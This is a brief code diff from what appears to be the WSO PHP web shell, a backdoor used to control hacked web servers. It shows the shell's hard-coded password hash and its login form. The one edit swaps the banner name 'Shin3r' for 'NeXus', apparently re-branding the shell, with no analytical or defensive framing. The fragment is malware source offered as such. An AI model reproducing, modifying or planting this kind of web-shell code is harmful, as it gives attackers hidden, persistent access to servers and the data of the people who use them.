@@ -2,7 +2,7 @@
 $auth_pass = "fb3bc9ec28a02c3031fa2de4baea9790
 ";
 function wsoLogin() {
-	die("<pre align=center><form method=post>Shin3r: <input type=password name=pass><input type=submit value='>>'></form></pre>");
+	die("<pre align=center><form method=post>NeXus: <input type=password name=pass><input type=submit value='>>'></form></pre>");
 }
 
 function WSOsetcookie($k, $v) {
